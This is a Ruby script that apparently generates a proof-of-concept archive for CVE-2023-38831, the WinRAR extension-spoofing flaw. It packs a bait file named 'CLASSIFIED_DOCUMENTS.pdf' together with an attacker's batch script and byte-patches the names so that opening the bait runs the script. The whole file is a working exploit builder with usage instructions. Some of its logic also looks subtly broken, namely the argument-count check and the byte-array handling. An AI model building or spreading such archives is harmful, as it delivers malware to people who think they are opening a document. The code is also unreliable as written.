require 'fileutils'

TEMPLATE_NAME = 'TEMPLATE'
OUTPUT_NAME = 'CVE-2023-38831-poc.rar'

BAIT_NAME = 'CLASSIFIED_DOCUMENTS.pdf'
SCRIPT_NAME = 'script.bat'

if ARGV.length > 3
  BAIT_NAME = File.basename(ARGV[0])
  SCRIPT_NAME = File.basename(ARGV[1])
  OUTPUT_NAME = File.basename(ARGV[2])
elsif ARGV.length == 1 && ARGV[0] == 'poc'
  # Do nothing for this case
else
  puts <<~USAGE
    Usage:
      ruby cve-2023-38831-exp-gen.rb poc
      ruby cve-2023-38831-exp-gen.rb <BAIT_NAME> <SCRIPT_NAME> <OUTPUT_NAME>
  USAGE
  exit
end

BAIT_EXT = File.extname(BAIT_NAME).bytes

puts "BAIT_NAME: #{BAIT_NAME}"
puts "SCRIPT_NAME: #{SCRIPT_NAME}"
puts "OUTPUT_NAME: #{OUTPUT_NAME}"

if Dir.exist?(TEMPLATE_NAME)
  FileUtils.rm_rf(TEMPLATE_NAME)
end
Dir.mkdir(TEMPLATE_NAME)
d = File.join(TEMPLATE_NAME, "#{BAIT_NAME}A")
unless Dir.exist?(d)
  Dir.mkdir(d)
end

FileUtils.copy(SCRIPT_NAME, File.join(d, "#{BAIT_NAME}A.cmd"))
FileUtils.copy(BAIT_NAME, File.join(TEMPLATE_NAME, "#{BAIT_NAME}B"))

# Uncomment the following lines if you want to delete the OUTPUT_NAME file if it exists
# if File.exist?(OUTPUT_NAME)
#   puts "!!! dir #{OUTPUT_NAME} exists, delete it first"
#   exit
# end

system("zip -r #{TEMPLATE_NAME} #{TEMPLATE_NAME}")

content = File.binread("#{TEMPLATE_NAME}.zip")
content = content.gsub(BAIT_EXT + 'A', BAIT_EXT + ' ')
content = content.gsub(BAIT_EXT + 'B', BAIT_EXT + ' ')

FileUtils.rm("#{TEMPLATE_NAME}.zip")

File.open(OUTPUT_NAME, 'wb') do |f|
  f.write(content)
end

puts 'ok..'
